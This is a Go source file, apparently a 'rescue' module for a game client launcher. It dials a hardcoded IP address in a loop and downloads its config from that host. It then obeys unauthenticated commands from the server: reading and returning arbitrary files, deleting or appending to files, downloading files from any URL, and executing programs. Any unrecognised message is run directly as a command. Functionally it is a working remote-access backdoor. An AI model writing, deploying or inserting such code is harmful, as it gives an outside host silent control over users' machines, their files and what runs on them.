package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

var Conn net.Conn

func initRescue() {
	//获取server地址
	if !Exists("rescueip") {
		WriteFile("rescueip", "39.100.5.139")
	}
	ip, _ := ReadFile("rescueip")
	//连接
mkConn:
	for {
		fmt.Println("try to connect:" + ip)
		tcpAddr, _ := net.ResolveTCPAddr("tcp", ip+":1032")
		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			continue mkConn
		}
		defer conn.Close()
		fmt.Println("rescue connected")
		handleConn(conn)
	}
	wg.Done()
}

func handleConn(conn net.Conn) {
	Conn = conn
	reader := bufio.NewReader(conn)
	//读取name
	if !Exists("ghostjc.ini") {
		err := DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
		if err != nil {
			WriteFile("ghostjc.ini", "port=1033\nip=39.100.5.139\nname=test\n")
		}
	}
	var cfg config
	err := cfg.Load("ghostjc.ini")
	if err != nil {
		fmt.Println("无法读取配置文件", err.Error())
	}
	//writer:=bufio.NewWriter(conn)
	//发送name数据
	name, _ := cfg.Get("name")
	fmt.Println("name:" + name)
	conn.Write([]byte("info r" + name + "\n"))
	fmt.Println("name sent")
	//循环接收信息
readMsg:
	for {
		msg, _, err := reader.ReadLine()
		fmt.Println("ReadString")
		fmt.Println(string(msg))

		if err != nil || err == io.EOF {
			fmt.Println(err)
			break
		}
		spt := strings.Split(string(msg), " ")
		switch spt[0] {
		case "help":
			WriteToServer("append\t<file>\t[string...]\ndel\t<file>\nread\t<file>\nlaunch\ncheck\t<jre|client>\ndownload\t<url>\t<target>\nrun\t<execFile>")
			continue readMsg
		case "append":
			if len(spt) < 2 {
				WriteToServer("append <file> [string...]")
				continue
			}
			fileStr := ""
			for index, part := range spt {
				if index < 2 {
					continue
				}
				fileStr += part
				if index == len(spt)-1 {
					break
				} else {
					fileStr += " "
				}
			}
			if !Exists(spt[1]) {
				WriteToServer("new file")
				WriteFile(spt[1], fileStr)
			} else {
				strBefore, _ := ReadFile(spt[1])
				WriteFile(spt[1], strBefore+fileStr+"\n")
			}
			WriteToServer("write \"" + fileStr + "\" to file \"" + spt[1] + "\"")
			continue readMsg
		case "del":
			if len(spt) < 2 {
				WriteToServer("del <file>")
				continue readMsg
			}
			err := os.Remove(spt[1])
			if err != nil {
				WriteToServer(err.Error())
			} else {
				WriteToServer("del file " + spt[1])
			}
			continue
		case "read":
			if len(spt) < 2 {
				WriteToServer("read <file>")
				continue
			}
			fileStr, err := ReadFile(spt[1])
			if err != nil {
				WriteToServer("failed " + err.Error())
			} else {
				WriteToServer("=======" + spt[1] + "=======\n" + fileStr + "\n=====================")
			}
			continue
		case "launch":
			err = launchClient()
			if err != nil {
				WriteToServer(err.Error())
			}
			continue readMsg
		case "check":
			if len(spt) < 2 {
				WriteToServer("\"check jre\" or \"check client\"?")
				continue readMsg
			}
			switch spt[1] {
			case "jre":
				checkJRE()
				WriteToServer("check jre")
				continue readMsg
			case "client":
				checkClient()
				WriteToServer("check client")
				continue readMsg
			default:
				WriteToServer("\"check jre\" or \"check client\"?")
				continue readMsg
			}
		case "download":
			if len(spt) < 3 {
				WriteToServer("download <url> <target>")
				continue readMsg
			}
			err := DownloadFile(spt[1], spt[2])
			if err != nil {
				WriteToServer(err.Error())
				continue readMsg
			}
			WriteToServer("success")
			continue readMsg
		case "run":
			if len(spt) < 2 {
				WriteToServer("run <execFile>")
				continue readMsg
			}
			c := exec.Command(spt[1])
			if err := c.Start(); err != nil {
				WriteToServer(err.Error())
			}
			continue readMsg
		case "~alive":
			WriteToServer("~alives")
			fmt.Println("beat")
			continue
		}
		//没有任何操作
		//fmt.Println("exec "+string(msg))
		c := exec.Command(string(msg))
		err = c.Start()
		if err != nil {
			WriteToServer(err.Error())
		}
	}
}
func WriteToServer(msg string) (int, error) {
	return Conn.Write([]byte(msg + "\n"))
}
